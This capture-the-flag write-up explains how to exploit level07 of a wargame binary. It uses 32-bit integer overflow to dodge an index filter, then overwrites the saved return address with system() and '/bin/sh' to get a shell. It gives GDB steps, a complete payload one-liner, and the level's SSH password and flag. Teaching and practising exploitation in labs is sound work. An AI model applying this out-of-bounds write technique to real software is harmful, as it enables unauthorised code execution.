# 🔐 Level07 - Integer Overflow Bypass

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Time to exploit an integer overflow vulnerability to bypass security checks!

## 📋 Binary Analysis

### 🔍 Architecture & Security

**Platform:** x86 (32-bit ELF)

**Protection Mechanisms:**
- ✅ Stack canary (`__stack_chk_fail`)
- ✅ Environment variable clearing (anti-shellcode)
- ❌ No ASLR (addresses are predictable)
- ❌ Weak bounds checking (integer overflow bypass)

### Decompiled Code

#### Main Function

```c
int main(int argc, char **argv, char **envp)
{
    char command[20];
    unsigned int data[100];  // 400 bytes (100 integers)
    int status = 0;
    
    // Initialize data storage
    memset(data, 0, sizeof(data));
    
    // Security measure: Zero out argv and envp to prevent environment exploits
    for (char **arg = argv; *arg != NULL; arg++) {
        memset(*arg, 0, strlen(*arg));
    }
    for (char **env = envp; *env != NULL; env++) {
        memset(*env, 0, strlen(*env));
    }
    
    puts("----------------------------------------------------");
    puts("  Welcome to wil's crappy number storage service!   ");
    puts("----------------------------------------------------");
    puts(" Commands:                                          ");
    puts("    store - store a number into the data storage    ");
    puts("    read  - read a number from the data storage     ");
    puts("    quit  - exit the program                        ");
    puts("----------------------------------------------------");
    puts("   wil has reserved some storage :>                ");
    puts("----------------------------------------------------");
    
    // Command loop
    while (true) {
        printf("Input command: ");
        status = 1;
        
        if (fgets(command, 20, stdin) == NULL)
            break;
        
        command[strcspn(command, "\n")] = '\0';
        
        if (strcmp(command, "store") == 0) {
            status = store_number(data);
        }
        else if (strcmp(command, "read") == 0) {
            status = read_number(data);
        }
        else if (strcmp(command, "quit") == 0) {
            return 0;
        }
        
        if (status == 0) {
            printf(" Completed %s command successfully\n", command);
        } else {
            printf(" Failed to do %s command\n", command);
        }
        
        memset(command, 0, sizeof(command));
    }
    
    return 0;
}
```

#### Store Number Function

```c
int store_number(unsigned int *data)
{
    unsigned int number;
    unsigned int index;
    
    printf(" Number: ");
    number = get_unum();
    printf(" Index: ");
    index = get_unum();
    
    // Security checks (both bypassable!)
    if ((index % 3 == 0) || (number >> 24 == 0xb7)) {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return 1;
    }
    
    // CRITICAL VULNERABILITY: No upper bound checking!
    data[index] = number;  // Writes to: data_base + (index * 4)
    
    return 0;
}
```

#### Read Number Function

```c
int read_number(unsigned int *data)
{
    unsigned int index;
    
    printf(" Index: ");
    index = get_unum();
    
    // VULNERABILITY: No bounds checking at all!
    printf(" Number at data[%u] is %u\n", index, data[index]);
    
    return 0;
}
```

### Key Observations

1. **Out-of-Bounds Write**: `store_number()` allows writing to any memory location
2. **Security Checks**:
   - Modulo-3 filter: Blocks indices where `index % 3 == 0`
   - Address filter: Blocks numbers with top byte `0xb7`
3. **No Upper Bound Check**: Never validates `index < 100`
4. **Integer Overflow**: 32-bit multiplication can wrap around
5. **Environment Cleared**: Can't use environment variable shellcode like level05

## 🚨 Vulnerability

### CWE-787: Out-of-Bounds Write + CWE-190: Integer Overflow

The program has two critical flaws:

```c
// Check 1: Modulo-3 filter
if (index % 3 == 0) {
    return ERROR;  // Blocks index 114 (our target!)
}

// Check 2: Address filter  
if (number >> 24 == 0xb7) {
    return ERROR;  // Only blocks old libc addresses
}

// The vulnerability
data[index] = number;  // No check that index < 100!
```

**The problem:**
- We need to write to **index 114** (saved EIP location on stack)
- But `114 % 3 == 0`, so it's blocked!
- The security check uses the **input value** (`index`)
- But the memory write uses the **calculated offset** (`index * 4`)
- We can exploit 32-bit integer overflow to bypass the check!

### Integer Overflow Exploitation

When multiplying `index * 4`, if the result exceeds `2^32 - 1` (4294967295), it wraps around:

```
Normal calculation:
  index = 114
  offset = 114 * 4 = 456 bytes
  114 % 3 = 0 ❌ BLOCKED!

Overflow calculation:
  index = 1073741938
  offset = 1073741938 * 4 = 4294967752
  
  In 32-bit arithmetic:
  4294967752 mod 2^32 = 456 bytes ✅ Same target!
  
  But security check:
  1073741938 % 3 = 1 ✅ BYPASSED!
```

## 🎯 The Attack

### Strategy: ret2libc via Integer Overflow

We'll use the integer overflow to:
1. **Bypass the modulo-3 check** using a large index
2. **Overwrite the saved EIP** with `system()` address
3. **Set up the argument** to point to `"/bin/sh"`
4. **Trigger return** to execute `system("/bin/sh")`

### Step 1: Find the Saved EIP Location

Using GDB:

```bash
gdb ./level07
(gdb) break *main+110
(gdb) run
(gdb) info frame
```

**Why `*main+110`?** This breaks after stack allocation and alignment, giving us the final stack layout.

**Output (example):**
```
Saved registers:
  ebp at 0xffffdcb8, eip at 0xffffdcbc
```

Note the saved EIP address: `eip at 0xffffdcbc`

**Find data array address:**

From the assembly (`lea [ESP + 0x24]`), the data array is at ESP + 0x24:
```bash
(gdb) p/x $esp + 0x24
$1 = 0xffffdaf4
```

**Calculate offset:**
```bash
(gdb) p/d (0xffffdcbc - 0xffffdaf4) / 4
$2 = 114
```

Or manually: `(0xffffdcbc - 0xffffdaf4) = 456 bytes, 456 / 4 = 114`

The saved EIP is at **index 114**. Problem: `114 % 3 == 0` (blocked!)

### Step 2: Calculate the Magic Index

We need an index where:
- `(index * 4) mod 2^32 = 456` (writes to correct location)
- `index % 3 != 0` (bypasses security check)

**Solution:**
```
Target offset: 456 bytes
We need: (index × 4) to wrap around to 456 in 32-bit arithmetic

How it works:
  In 32-bit systems, numbers wrap at 2^32 (4,294,967,296)
  
  index = (2^32 + 456) / 4
  index = 4,294,967,752 / 4
  index = 1,073,741,938

Verification:
  1,073,741,938 × 4 = 4,294,967,752
  4,294,967,752 exceeds 2^32, so it wraps:
  4,294,967,752 - 4,294,967,296 = 456 ✅
  456 / 4 = 114 (our target) ✅
  1,073,741,938 % 3 = 1 (bypasses check!) ✅
```

**Magic index: 1073741938**

### Step 3: Find Required Addresses

Using GDB:

**system() address:**
```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
Decimal: **4159090384**

**"/bin/sh" string:**
```bash
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
```
Decimal: **4160264172**

### Step 4: Construct the ret2libc Chain

We need to build this stack layout:

```
Stack after exploitation:
┌────────────────────┬────────────────┐
│ Index              │ Value          │
├────────────────────┼────────────────┤
│ 114 (saved EIP)    │ 0xf7e6aed0     │ ← system()
│ 115 (return addr)  │ 0x00000000     │ ← dummy
│ 116 (1st argument) │ 0xf7f897ec     │ ← "/bin/sh"
└────────────────────┴────────────────┘
```

When `quit` executes and the function returns:
1. EIP is loaded with `system()` address
2. Execution jumps to `system()`
3. `system()` reads first argument from stack
4. Finds pointer to `"/bin/sh"`
5. Executes: `system("/bin/sh")` → Shell!

### Step 5: Build the Payload

```
Action 1: Overwrite EIP
  Command: store
  Number:  4159090384  (system address)
  Index:   1073741938  (overflows to 114)

Action 2: Set argument
  Command: store
  Number:  4160264172  ("/bin/sh" address)
  Index:   116

Action 3: Trigger
  Command: quit
```

## 💣 Exploit

### Complete Payload

```bash
ssh level07@localhost -p 2222
# Password: GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8

(python -c 'print "store\n4159090384\n1073741938\nstore\n4160264172\n116\nquit"'; cat) | ./level07
```

### Payload Breakdown

```python
print "store\n4159090384\n1073741938\n"  # Overwrite EIP with system()
print "store\n4160264172\n116\n"          # Set argument to "/bin/sh"
print "quit\n"                             # Trigger return
```

The `cat` keeps stdin open for shell interaction.

### Output

```
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                
----------------------------------------------------
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command: whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

---

> 💡 **Pro Tip**: Integer overflow vulnerabilities are subtle because the security check operates on the **input value**, while the actual memory operation uses the **computed result** after overflow. Always validate both!

> 💡 **Why 1073741938?**: This specific value was calculated to produce exactly 456 bytes after 32-bit overflow (`(2^32 + 456) / 4`), while also satisfying `value % 3 != 0`. The math works perfectly!

> 💡 **ret2libc Power**: Even with environment variables cleared (preventing environment shellcode), ret2libc attacks remain effective because we're using existing code (libc functions) rather than injecting new code.

## 📚 Technical Deep Dive

### Understanding 32-bit Integer Overflow

```
32-bit unsigned integer range: 0 to 4,294,967,295 (2^32 - 1)

When you multiply beyond this limit:
  1,073,741,938 × 4 = 4,294,967,752

This exceeds 2^32, so it wraps:
  4,294,967,752 mod 4,294,967,296 = 456

Visual representation:
┌─────────────────────────────────────┐
│ 0x00000000 (0)                      │
│   ...                               │
│   0x000001C8 (456) ← Target         │
│   ...                               │
│ 0xFFFFFFFF (4,294,967,295)          │
└─────┬───────────────────────────────┘
      │ Overflow wraps back
      └─> 4,294,967,752 becomes 456
```

### The Modulo-3 Pattern

Indices divisible by 3 are blocked: 0, 3, 6, 9, ..., 114, 117, ...

Why modulo-3? Possibly to protect:
- Index 0: Start of array
- Index 3, 6, 9...: Regular intervals
- Index 114: Saved EIP (main target!)

**But integer overflow breaks this pattern!**

### Why the Address Filter Fails

```c
if (number >> 24 == 0xb7) {
    // Block operation
}
```

**Historical context:**
- Old libc (pre-2010): `0xb7xxxxxx` range
- Modern libc: `0xf7xxxxxx` range

**Our addresses:**
- `system()`: `0xf7e6aed0` (top byte: `0xf7` ✅ Not blocked)
- `"/bin/sh"`: `0xf7f897ec` (top byte: `0xf7` ✅ Not blocked)

The filter is **obsolete** for modern systems!

### ret2libc Without Environment

Unlike level05, we can't use environment variable shellcode because:
```c
for (char **env = envp; *env != NULL; env++) {
    memset(*env, 0, strlen(*env));  // Cleared!
}
```

**Solution:** Use ret2libc instead:
- No shellcode needed
- Just redirect execution to existing libc functions
- Set up the stack to pass arguments
- Standard technique when code injection is prevented

## 🔒 Security Notes

### Vulnerabilities Exploited

1. **[CWE-787](https://cwe.mitre.org/data/definitions/787.html)**: Out-of-Bounds Write
2. **[CWE-190](https://cwe.mitre.org/data/definitions/190.html)**: Integer Overflow or Wraparound
3. **[CWE-682](https://cwe.mitre.org/data/definitions/682.html)**: Incorrect Calculation

### Defense Failures

**Why the protections failed:**

| Protection | Intended Effect | Actual Result |
|------------|----------------|---------------|
| Modulo-3 check | Block critical indices | ❌ Bypassed via overflow |
| 0xb7 filter | Block libc addresses | ❌ Outdated for modern libc |
| Environment clearing | Prevent shellcode | ❌ ret2libc doesn't need it |
| Stack canary | Detect corruption | ❌ We overwrite saved EIP precisely |

### Real-World Mitigations

**Proper bounds checking:**
```c
if (index >= 100) {
    return ERROR;  // Check upper bound!
}
```

**Use size-aware types:**
```c
size_t index;  // Better for array indexing
if (index >= sizeof(data)/sizeof(data[0])) {
    return ERROR;
}
```

**Check computed values:**
```c
size_t offset = index * sizeof(unsigned int);
if (offset >= sizeof(data)) {  // Validate after calculation
    return ERROR;
}
```

**Enable modern protections:**
- **ASLR**: Randomizes memory addresses
- **Full RELRO**: Makes GOT read-only
- **PIE**: Position-independent executable
- **Stack canaries**: Detect buffer overflows (already present, but bypassed)

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

On to level08!
